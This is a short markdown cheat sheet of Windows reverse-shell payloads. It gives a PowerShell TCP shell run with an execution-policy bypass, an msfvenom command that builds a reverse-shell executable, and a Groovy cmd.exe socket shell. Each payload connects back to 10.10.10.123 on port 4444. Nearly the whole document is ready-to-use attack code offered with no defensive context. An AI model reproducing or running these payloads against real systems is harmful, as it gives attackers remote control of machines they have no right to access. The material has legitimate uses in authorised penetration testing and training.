# Windows reverse shells

## powershell
```powershell
# Create a powershell script with the name reverse.ps1
function reverse_powershell {
    $client = New-Object System.Net.Sockets.TCPClient("10.10.10.123",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}

# Execute reverse shell
powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
```

## CMD Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.10.123 LPORT=4444 -f exe > shell.exe
```

## groovy
```groovy
String host="10.10.10.123";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

